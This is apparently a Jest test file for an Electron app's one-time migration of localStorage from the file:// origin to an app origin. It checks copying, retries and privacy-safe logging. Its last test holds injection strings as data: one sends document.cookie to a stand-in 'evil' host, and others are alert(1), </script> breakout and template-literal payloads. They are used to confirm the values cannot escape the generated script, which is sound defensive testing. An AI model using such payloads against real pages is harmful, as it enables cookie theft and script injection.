'use strict';

// One-time localStorage move from file:// to the app origin (electron-origin-migration.js).

const vm = require('vm');
const { migrateFileOriginStorage, MIGRATED_KEY } = require('../../electron-origin-migration');

function memoryStore(initial = {}) {
  const data = { ...initial };
  return { get: (key, fallback) => (key in data ? data[key] : fallback), set: (key, value) => { data[key] = value; }, data };
}

function fakeLocalStorage(initial) {
  const map = new Map(Object.entries(initial));
  const storage = {
    getItem: (k) => (map.has(k) ? map.get(k) : null),
    setItem: (k, v) => { map.set(k, String(v)); },
    map
  };
  return new Proxy(storage, {
    ownKeys: () => [...map.keys()],
    getOwnPropertyDescriptor: (target, key) => (map.has(key) ? { enumerable: true, configurable: true, value: map.get(key) } : undefined),
    get: (target, key) => (key in target ? target[key] : map.get(key))
  });
}

/** Windows whose executeJavaScript runs the script against the origin's storage. */
function fakeWindows(storages, { failLoad = false } = {}) {
  const created = [];
  const scripts = [];
  const createPage = () => {
    let origin = null;
    const win = {
      loadURL: async (url) => { if (failLoad) throw new Error('load failed'); origin = url.startsWith('file:') ? 'file' : 'app'; },
      webContents: { executeJavaScript: async (code) => { scripts.push(code); return vm.runInNewContext(code, { window: { localStorage: storages[origin] }, Object, JSON, atob, Uint8Array, TextDecoder }); } },
      destroyed: false,
      destroy() { this.destroyed = true; }
    };
    created.push(win);
    return win;
  };
  return { createPage, created, scripts };
}

const URLS = { fileOriginUrl: 'file:///Users/x/Library/Application%20Support/LANA/storage-migration.html', appOriginUrl: 'lana-app://app/__storage-migration' };

test('copies the old origin\'s keys once, never overwriting the app origin, and closes its windows', async () => {
  const storages = {
    file: fakeLocalStorage({ user: '{"id":"u1"}', lana_saved_server: '{"url":"https://chef"}', 'section-a': 'open' }),
    app: fakeLocalStorage({ 'section-a': 'closed' })
  };
  const { createPage, created } = fakeWindows(storages);
  const store = memoryStore();
  const logs = [];

  const result = await migrateFileOriginStorage({ store, createPage, ...URLS, log: (m) => logs.push(m) });
  expect(result).toEqual({ status: 'migrated', copied: 2 });
  expect(storages.app.getItem('user')).toBe('{"id":"u1"}');
  expect(storages.app.getItem('lana_saved_server')).toBe('{"url":"https://chef"}');
  expect(storages.app.getItem('section-a')).toBe('closed');
  expect(store.data[MIGRATED_KEY]).toBe(true);
  expect(created.every((w) => w.destroyed)).toBe(true);
  // Counts only: values may be personal data.
  expect(logs.join('\n')).not.toMatch(/u1|chef/);

  const again = await migrateFileOriginStorage({ store, createPage, ...URLS });
  expect(again).toEqual({ status: 'done' });
  expect(created).toHaveLength(2);
});

test('an empty old origin is marked done without opening an app window', async () => {
  const storages = { file: fakeLocalStorage({}), app: fakeLocalStorage({}) };
  const { createPage, created } = fakeWindows(storages);
  const store = memoryStore();
  expect(await migrateFileOriginStorage({ store, createPage, ...URLS })).toEqual({ status: 'migrated', copied: 0 });
  expect(created).toHaveLength(1);
  expect(store.data[MIGRATED_KEY]).toBe(true);
});

test('a failure leaves it unmarked so the next start tries again', async () => {
  const storages = { file: fakeLocalStorage({ user: 'x' }), app: fakeLocalStorage({}) };
  const store = memoryStore();
  let calls = 0;
  const createPage = () => ({
    loadURL: async (url) => { calls += 1; if (url.startsWith('lana-app:')) throw new Error('no protocol'); },
    webContents: { executeJavaScript: async (code) => vm.runInNewContext(code, { window: { localStorage: storages.file }, Object, JSON }) },
    destroy() {}
  });
  expect(await migrateFileOriginStorage({ store, createPage, ...URLS, log: () => {} })).toEqual({ status: 'failed' });
  expect(store.data[MIGRATED_KEY]).toBeUndefined();
  expect(calls).toBe(2);
});

test('an old origin that cannot be read is not marked done', async () => {
  const store = memoryStore();
  const createPage = () => ({ loadURL: async () => { throw new Error('file page missing'); }, webContents: {}, destroy() {} });
  expect(await migrateFileOriginStorage({ store, createPage, ...URLS, log: () => {} })).toEqual({ status: 'failed' });
  expect(store.data[MIGRATED_KEY]).toBeUndefined();
});

// Old localStorage values are outside input: the write script carries them only as base64,
// so no quote, backtick or line separator in a value can end the string and run.
test('values with quotes and script are copied exactly and never appear in the page script', async () => {
  const hostile = {
    a: "x';location='https://evil/?'+document.cookie;'",
    b: 'x"); alert(1); ("',
    c: '`${alert(1)}`',
    d: '</script><script>alert(1)</script>',
    e: 'line\u2028sep\u2029end',
    f: 'unicode \u00e9 \ud83d\ude00'
  };
  const storages = { file: fakeLocalStorage(hostile), app: fakeLocalStorage({}) };
  const { createPage, scripts } = fakeWindows(storages);
  const result = await migrateFileOriginStorage({ store: memoryStore(), createPage, ...URLS });
  expect(result).toEqual({ status: 'migrated', copied: 6 });
  for (const [key, value] of Object.entries(hostile)) expect(storages.app.getItem(key)).toBe(value);
  const write = scripts[1];
  for (const fragment of ['location=', 'alert(1)', '</script>', 'evil', '\u2028']) expect(write).not.toContain(fragment);
});
